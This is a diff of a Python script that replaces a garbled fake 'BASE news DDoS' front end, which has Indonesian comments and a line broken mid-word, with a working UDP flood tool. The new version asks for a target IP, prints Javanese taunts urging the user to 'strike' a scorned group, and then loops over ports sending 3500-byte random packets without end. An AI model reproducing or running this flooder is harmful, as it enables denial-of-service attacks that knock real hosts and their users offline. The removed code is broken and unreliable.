@@ -1,134 +1,77 @@
 # -*- coding: utf-8 -*-
-#! /usr/bin/python3,11                                                                                                                   import os
-import requests
-import datetime
-import asyncio
-import validators
-from urllib.parse import urlparse
-from sys import stdout
-from colorama import Fore, Style, init
-import logging                                                                                                                             
-# Inisialisasi Colorama dan Logging                                                                                                        init(autoreset=True)
-                                                                                                                                           # Pengaturan Logging yang benar
-logging.basicConfig(
-    filename='attack.log',
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',  # Perbaiki dari levellevel menjadi levelname                                          datefmt='%Y-%m-%d %H:%M:%S'
-)
-
-# Fungsi untuk Logging Informasi Serangan
-def log_attack_status(message, level='info', print_to_terminal=True):
-    if level == 'info':
-        logging.info(message)
-        if print_to_terminal:
-            print(f"{Fore.CYAN}|    [INFO] {message.ljust(63)}|")
-    elif level == 'error':
-        logging.error(message)
-        if print_to_terminal:
-            print(f"{Fore.RED}|    [ERROR] {message.ljust(63)}|")
-    elif level == 'warning':
-        logging.warning(message)
-        if print_to_terminal:
-            print(f"{Fore.YELLOW}|    [WARNING] {message.ljust(63)}|")
+import os
+import socket
+import random
+import time
 
 
-# Fungsi untuk Menampilkan Header BASE dengan Warna
-def display_header():
-    header_lines = [
-f"{Fore.GREEN}",
-f"{Fore.GREEN}             ╔═ ╗  ",         
-f"{Fore.GREEN}             ║█ ║  ",
-f"{Fore.GREEN}             ║█ ║  ",
-f"{Fore.GREEN}             ║█ ║  ",      
-f"{Fore.GREEN}             ║█ ║   ",    
-f"{Fore.GREEN}             ║█ ║     ║████████ ║",
-f"{Fore.GREEN}             ║█ ║     ║█ ╔══════╝",
-f"{Fore.GREEN}             ║█ ║     ║████████ ║",
-f"{Fore.GREEN}             ║████████████████ ║",
-f"{Fore.GREEN}            ║█ ╔══════════════╝", 
-f"{Fore.GREEN} ╔═ ╗         ███╗",    
-f"{Fore.GREEN} ║█ ║            █ ║",
-f"{Fore.GREEN} ║████████████████ ║",
-f"{Fore.GREEN}  ║██████████████ ║",
-f"{Fore.GREEN}  ╚═══════════════╝",
-f"{Fore.GREEN}",
-f"{Fore.GREEN}",
-f"{Fore.GREEN}",
-    ]
-# Tampilkan header dengan warna
-    for line in header_lines:
-        print(line)
+# Colors
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    UNDERLINE = '\033[4m'
+    PURPLE = '\033[97m'
+    BOLD    = "\033[1m"
+    BLACK   = "\033[30m"
+    RED     = "\033[31m"
+    GREEN   = "\033[32m"
+    YELLOW  = "\033[33m"
+    BLUE    = "\033[34m"
+    MAGENTA = "\033[35m"
+    CYAN    = "\033[36m"
+    WHITE   = "\033[37m"
+    os.system("clear")
 
-    # Versi dan URL
-    print(f"{Fore.WHITE}{Style.BRIGHT}{' ' * 57}v.1.0")
-    print(f"{Fore.CYAN}{Style.BRIGHT}{' ' * 16}https://githhub.com/ZA9474/BASEnews-DDoS.git")
-    print(f"{Fore.CYAN}|{'=' * 74}|")
+########################
+white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(3500)
+####################
 
-# Fungsi untuk Meminta Input dari Pengguna dengan Tampilan Rapi
-def get_user_input(prompt_message):
-    print(f"{Fore.GREEN}|{' ' * 4}[?] {prompt_message.ljust(63)}|")
-    print(f"{Fore.GREEN}|{'=' * 74}|")
-    return input(f"{Fore.YELLOW}{' ' * 4}> ").strip()
+os.system("clear")
+print("""
 
-# Fungsi Countdown untuk Menampilkan Waktu Serangan
-def countdown(t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    while True:
-        remaining_time = (until - datetime.datetime.now()).total_seconds()
-        if remaining_time > 1:
-            stdout.flush()
-            stdout.write(f"\r{Fore.BLUE}|  [*] {Fore.YELLOW}BASE news {Fore.WHITE} Attack'ts  {Fore.RED}{remaining_time:.2f}  {Fore.BLUE}Sec left {' ' * 26}|")
-            stdout.flush()
-            stdout.write(f"\r{Fore.YELLOW}|  [*] {Fore.CYAN}BASE news {Fore.RED} Attack'ts  {Fore.GREEN}{remaining_time:.2f}  {Fore.MAGENTA}Sec left {' ' * 26}|")
-            stdout.flush() 
-            stdout.write(f"\r{Fore.RED}|  [*] {Fore.YELLOW}חדשות BASE  {Fore.CYAN} ההתקפה הסתיימה!{' ' * 53}|\n")
-        else:
-            stdout.flush()
-            stdout.write(f"\r{Fore.RED}|  [+] {Fore.YELLOW}חדשות BASE  {Fore.CYAN} ההתקפה הסתיימה!{' ' * 53}|\n")
-            print(f"{Fore.CYAN}|{'=' * 74}|")
-            return
-
-# Validasi URL dan Parsing Target
-def get_target(url):
-    if not valid:
-    ators.url(url):
-        log_attack_status(f"URL tidak valid: {url}", level='error')
-        raise ValueError(f"URL tidak valid: {url}")
-
-    target = {
-        'uri': urlparse(url).path or "/",
-        'host': urlparse(url).netloc,
-        'scheme': urlparse(url).scheme,
-        'port': urlparse(url).netloc.split(":")[1] if ":" in urlparse(url).netloc else ("443" if urlparse(url).scheme == "https" else "80")
-    }
-    log_attack_status(f"Target diperoleh: {target['host']} ({target['scheme']}://{target['host']}:{target['port']}{target['uri']})")
-    return target
-
-# Fungsi Serangan Utama
-def launch_attack(target_url, duration):
-    target = get_target(target_url)
-
-    # Inisialisasi Serangan dan Waktu Serangan
-    log_attack_status(f"Meluncurkan serangan ke {target['host']} untuk {duration} detik...")
-    countdown(duration)
-
-if __name__ == "__main__":
-    # Tampilkan Header
-    display_header()
-
-    # Prompt untuk input dari pengguna dengan tampilan yang rapi
-    target_url = get_user_input("Masukkan target URL:   ")
-    while not validators.url(target_url):
-        print(f"{Fore.RED}|    [ERROR] URL tidak valid. Coba lagi.{' ' * 37}|")
-        print(f"{Fore.CYAN}|{'=' * 74}|")
-        target_url = get_user_input("Masukkan target URL:")
-
-    try:
-        attack_duration = int(get_user_input("Masukkan durasi serangan (detik):"))
-    except ValueError:
-        attack_duration = 60  # Default durasi
-
-    # Luncurkan serangan
-    launch_attack(target_url, attack_duration)
-
-
+                   ╔═ ╗           
+                   ║█ ║  
+                   ║█ ║  
+                   ║█ ║        
+                   ║█ ║       
+                   ║█ ║     ║████████ ║
+                   ║█ ║     ║█ ╔══════╝
+                   ║█ ║     ║████████ ║
+                   ║████████████████ ║
+                   ║█ ╔══════════════╝ 
+╔═ ╗                ███╗   
+║█ ║                 █ ║
+║████████████████ ║
+  ║██████████████ ║
+  ╚═══════════════╝
+""")
+ip = input("[+] Target's IP : ")
+time.sleep(5),
+print("\033[94m            --⟩⟩ : IDRIB...!!! \033[0m "),
+time.sleep(5),
+print("\033[96m            --⟩⟩ : Iku fi'il amar \033[0m "),
+time.sleep(5),
+print("\033[92m            --⟩⟩ : Kang tegese  pukulah...!! \033[0m "),
+time.sleep(5),
+print("\033[33m            --⟩⟩ : Dadi sc iki kanggo nggebug arrogansi \033[0m "),
+time.sleep(5),
+print("\033[35m            --⟩⟩ : Kaum wedhus \033[0m "),
+time.sleep(5),
+print("\033[97m            --⟩⟩ : Sing seneng nglakoni sakarep udele \033[0m "),
+time.sleep(5),
+print("\033[33m            --⟩⟩ : Monggo mbakyu, Maseh dikawiti Serangane...\033[0m")
+time.sleep(5)
+while True:
+    sent = 0
+    for port in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        sent = sent + 1
+        time.sleep(1)
+        print("\033[94m[IDRIB] \033[97m%s  \033[31m[Ngirim ke]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
+    if():
+        s.close
+        print("\033[92mSerangan wes Rampung\033[0m")
